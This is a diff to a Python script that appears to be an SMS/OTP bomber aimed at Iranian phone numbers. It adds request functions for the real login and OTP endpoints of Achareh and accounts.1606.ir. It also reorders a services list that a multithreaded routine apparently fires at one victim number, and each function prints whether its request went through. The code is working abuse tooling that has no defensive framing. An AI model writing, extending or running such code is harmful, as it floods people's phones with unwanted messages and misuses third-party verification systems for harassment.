@@ -326,12 +326,39 @@ def activecleaners(phone):
     except: return False
 
 
+def achareh(phone):
+    phone = phone.split('+98')[-1].split('98')[-1]
+    try:
+        r = requests.post("https://api.achareh.co/v2/accounts/login/", json={"phone": "98" + phone}, timeout=5)
+        success = r.status_code == 200
+        print(f"[{'+' if success else '-'}] Achareh: {r.status_code}")
+        return success
+    except: return False
+
+
+
+def accounts1606(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    if not re.match(r"^09\d{9}$", phone): return False
+    try:
+        r = requests.post(f"https://accounts.1606.ir/otp/create?timestamp={int(time.time() * 1000)}", 
+                          json={"phoneOrEmail": phone}, headers={"Origin": "https://accounts.1606.ir", "Referer": "https://accounts.1606.ir/"}, timeout=10)
+        success = r.status_code == 200
+        print(f"[{'+' if success else '-'}] Accounts1606: {r.status_code}")
+        return success
+    except: return False
+
 # ==========================
 # لیست سرویس‌ها
 # ==========================
 services = [
-    digikala, bimehland, bimeparsian, ebimename, didar24 ,ibime ,bimeh, darunet, padmira, bornosmode ,chapmatin, vakiljo, basalam, azno, arzplus, azkivam, arzunex, alopeyk_safir, alldigitall, activecleaners
+    accounts1606, achareh, activecleaners, alldigitall, alopeyk_safir,
+    arzplus, arzunex, azkivam, azno, basalam,
+    bimeh, bimehland, bimeparsian, bornosmode, chapmatin,
+    darunet, didar24, digikala, ebimename, ibime,
+    padmira, vakiljo
 ]
+
 
 # ==========================
 # تابع VIP مولتی‌تردینگ
